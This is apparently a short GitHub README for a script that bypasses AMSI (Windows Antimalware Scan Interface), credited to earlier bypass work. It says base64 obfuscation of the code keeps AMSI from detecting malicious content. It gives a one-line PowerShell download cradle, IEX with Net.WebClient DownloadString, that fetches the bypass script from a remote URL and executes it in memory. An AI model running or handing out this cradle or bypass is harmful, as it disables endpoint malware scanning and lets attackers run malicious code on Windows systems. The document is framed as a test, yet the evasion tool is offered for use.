# Example of Amsi Scan Buffer byPass

This script is a simple test based on this work https://github.com/rasta-mouse/AmsiScanBufferBypass.
The main goal of this test is to demonstrate how obfuscating the code in base64 can avoid AMSI to detect Malicious Content.
The script can be executed via Net Web Client in a PowerShell.

```sh
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/xlenam/AmZiScanBufferBypass/master/AmZiScanBufferBypass.ps1"))
```